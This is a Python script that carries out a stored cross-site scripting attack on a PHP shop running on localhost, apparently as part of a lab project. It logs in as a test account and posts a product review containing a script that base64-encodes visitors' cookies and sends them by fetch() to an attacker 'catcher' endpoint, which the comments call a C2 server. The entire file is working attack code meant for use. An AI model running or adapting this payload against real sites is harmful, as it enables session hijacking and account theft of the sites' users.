import requests

# --- Target Configuration ---
BASE_URL = "http://localhost/CyberProject"
LOGIN_URL = f"{BASE_URL}/login.php"
# The ID of the electric kettle in the DB is 81
TARGET_PRODUCT_URL = f"{BASE_URL}/product_view.php?id=81"

# --- Login Credentials ---
USERNAME = "HUCKER"
PASSWORD = "hucker123"

# --- XSS Payload ---
# The code that steals the cookie and sends it to your C2 server
PAYLOAD = """
The handle gets too hot, and there's a weird smell.<script>
    var encoded = btoa(document.cookie);
    fetch('http://localhost/CyberProject/AttackerServer/catcher.php?data=' + encoded);
</script>
"""

def perform_stored_xss():
    # Create a Session object to preserve login cookies
    session = requests.Session()

    print("[*] Step 1: Logging into the system...")
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "login_submit": ""
    }
    
    response = session.post(LOGIN_URL, data=login_data)
    if "home.php" in response.url or session.cookies.get("PHPSESSID"):
        print(f"[+] Login successful as {USERNAME}!")
    else:
        print("[! ] Login failed. Check your credentials.")
        return

    print(f"[*] Step 2: Injecting Stored XSS into product page...")
    
    review_data = {
        "rating": "2",
        "content": PAYLOAD,
        "submit_review": ""
    }

    # Sending the malicious review
    inject_response = session.post(TARGET_PRODUCT_URL, data=review_data)

    if inject_response.status_code == 200:
        print("[SUCCESS] Payload injected successfully into the database!")
        print(f"[!] Now, any user visiting {TARGET_PRODUCT_URL} will be compromised.")
    else:
        print("[!] Failed to inject payload.")

if __name__ == "__main__":
    perform_stored_xss()